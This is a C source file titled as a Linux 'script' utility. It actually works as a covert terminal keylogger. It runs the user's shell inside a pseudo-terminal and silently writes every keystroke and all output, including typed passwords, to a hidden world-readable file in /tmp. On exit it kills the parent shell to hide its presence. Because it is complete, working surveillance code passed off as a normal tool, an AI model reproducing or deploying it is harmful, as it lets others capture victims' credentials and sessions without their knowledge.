/*
 * Title:  script (Linux)
 * Author: Shuichiro Endo
 */

//#define _DEBUG

#define _XOPEN_SOURCE 600

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <signal.h>
#include <termios.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/select.h>

#include "script.h"

#define BUFFER_SIZE 1024
#define LOGFILE_NAME_SIZE 1024

struct termios termios;

static char *logfile_directory = "/tmp";


static void fini(void)
{
    int ret = 0;
    pid_t ppid = -1;

    ret = tcsetattr(STDIN_FILENO, TCSANOW, &termios);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] [parent] tcsetattr error\n");
#endif
    }

    ppid = getppid();
    ret = kill(ppid, SIGHUP);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] [parent] kill error\n");
#endif
    }
}


int main(int argc, char* argv[])
{
    int master_fd = -1;
    int slave_fd = -1;
    int logfile_fd = -1;
    pid_t child_pid = -1;
    pid_t pid = -1;
    struct termios t;
    struct winsize window_size;
    fd_set in_fds;
    ssize_t read_count = 0;
    ssize_t write_count = 0;
    int ret = 0;
    char buffer[BUFFER_SIZE];
    char logfile_name[LOGFILE_NAME_SIZE];
    char *slave_name = NULL;
    char *shell;


    ret = tcgetattr(STDIN_FILENO, &termios);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] tcgetattr error\n");
#endif
        exit(0);
    }

    ret = ioctl(STDIN_FILENO, TIOCGWINSZ, &window_size);
    if(ret < 0){
#ifdef _DEBUG
        printf("[E] ioctl error\n");
#endif
        exit(0);
    }

    master_fd = posix_openpt(O_RDWR | O_NOCTTY);
    if(master_fd == -1){
#ifdef _DEBUG
        printf("[E] posix_openpt error\n");
#endif
        exit(0);
    }

    ret = grantpt(master_fd);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] grantpt error\n");
#endif
        close(master_fd);
        exit(0);
    }

    ret = unlockpt(master_fd);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] unlockpt error\n");
#endif
        close(master_fd);
        exit(0);
    }

    slave_name = ptsname(master_fd);
    if(slave_name == NULL){
#ifdef _DEBUG
        printf("[E] ptsname error\n");
#endif
        close(master_fd);
        exit(0);
    }


    child_pid = fork();
    if(child_pid == -1){
#ifdef _DEBUG
        printf("[E] fork error\n");
#endif
        close(master_fd);
        exit(0);
    }

    if(child_pid == 0){ // child
        ret = setsid();
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [child] setsid error\n");
#endif
            close(master_fd);
            exit(0);
        }

        close(master_fd);

        slave_fd = open((const char *)slave_name, O_RDWR);
        if(slave_fd == -1){
#ifdef _DEBUG
            printf("[E] [child] open error\n");
#endif
            exit(0);
        }

        ret = tcsetattr(slave_fd, TCSANOW, &termios);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [child] tcsetattr error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = ioctl(slave_fd, TIOCSWINSZ, &window_size);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [child] ioctl error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = dup2(slave_fd, STDIN_FILENO);
        if(ret != STDIN_FILENO){
#ifdef _DEBUG
            printf("[E] [child] dup2 error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = dup2(slave_fd, STDOUT_FILENO);
        if(ret != STDOUT_FILENO){
#ifdef _DEBUG
            printf("[E] [child] dup2 error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = dup2(slave_fd, STDERR_FILENO);
        if(ret != STDERR_FILENO){
#ifdef _DEBUG
            printf("[E] [child] dup2 error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        if(slave_fd > STDERR_FILENO){
            close(slave_fd);
        }

        shell = getenv("SHELL");
        if(shell == NULL || *shell == '\0'){
            shell = "/bin/sh";
        }

        execlp(shell, shell, (char *)NULL);

        exit(0);
    }else{  // parent
        pid = getpid();
        sprintf(logfile_name, "%s/.%d.txt", logfile_directory, (int)pid);

        logfile_fd = open(logfile_name, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
        if(logfile_fd == -1){
#ifdef _DEBUG
            printf("[E] [parent] open error\n");
#endif
            close(master_fd);
            exit(0);
        }

        ret = tcgetattr(STDIN_FILENO, &t);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [parent] tcgetattr error\n");
#endif
            close(master_fd);
            close(logfile_fd);
            exit(0);
        }

        termios = t;

        t.c_iflag &= ~(IGNBRK | BRKINT | PARMRK | INPCK | ISTRIP | INLCR | IGNCR | ICRNL | IXON);
        t.c_oflag &= ~(OPOST);
        t.c_lflag &= ~(ISIG | ICANON | ECHO | IEXTEN);
        t.c_cc[VMIN] = 1;
        t.c_cc[VTIME] = 0;

        ret = tcsetattr(STDIN_FILENO, TCSAFLUSH, &t);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [parent] tcsetattr error\n");
#endif
            close(master_fd);
            close(logfile_fd);
            exit(0);
        }

        ret = atexit(fini);
        if(ret != 0){
#ifdef _DEBUG
            printf("[E] [parent] atexit error\n");
#endif
            close(master_fd);
            close(logfile_fd);
            exit(0);
        }


        while(1){
            FD_ZERO(&in_fds);
            FD_SET(STDIN_FILENO, &in_fds);
            FD_SET(master_fd, &in_fds);

            ret = select(master_fd + 1, &in_fds, NULL, NULL, NULL);
            if(ret == -1){
#ifdef _DEBUG
                printf("[E] [parent] select error\n");
#endif
                close(master_fd);
                close(logfile_fd);
                exit(0);
            }

            if(FD_ISSET(STDIN_FILENO, &in_fds)){
                memset(buffer, 0, BUFFER_SIZE);
                read_count = read(STDIN_FILENO, buffer, BUFFER_SIZE);
                if(read_count <= 0){
#ifdef _DEBUG
                    printf("[E] [parent] read error\n");
#endif
                    close(master_fd);
                    close(logfile_fd);
                    exit(0);
                }

                write_count = write(master_fd, buffer, read_count);
                if(write_count != read_count){
#ifdef _DEBUG
                    printf("[E] [parent] write error\n");
#endif
                    close(master_fd);
                    close(logfile_fd);
                    exit(0);
                }

                write_count = write(logfile_fd, buffer, read_count);
                if(write_count != read_count){
#ifdef _DEBUG
                    printf("[E] [parent] write error\n");
#endif
                    close(master_fd);
                    close(logfile_fd);
                    exit(0);
                }
            }

            if(FD_ISSET(master_fd, &in_fds)){
                memset(buffer, 0, BUFFER_SIZE);
                read_count = read(master_fd, buffer, BUFFER_SIZE);
                if(read_count <= 0){
#ifdef _DEBUG
                    printf("[E] [parent] read error\n");
#endif
                    close(master_fd);
                    close(logfile_fd);
                    exit(0);
                }

                write_count = write(STDOUT_FILENO, buffer, read_count);
                if(write_count != read_count){
#ifdef _DEBUG
                    printf("[E] [parent] write error\n");
#endif
                    close(master_fd);
                    close(logfile_fd);
                    exit(0);
                }

                write_count = write(logfile_fd, buffer, read_count);
                if(write_count != read_count){
#ifdef _DEBUG
                    printf("[E] [parent] write error\n");
#endif
                    close(master_fd);
                    close(logfile_fd);
                    exit(0);
                }
            }
        }
    }

    close(master_fd);
    close(logfile_fd);

    return 0;
}

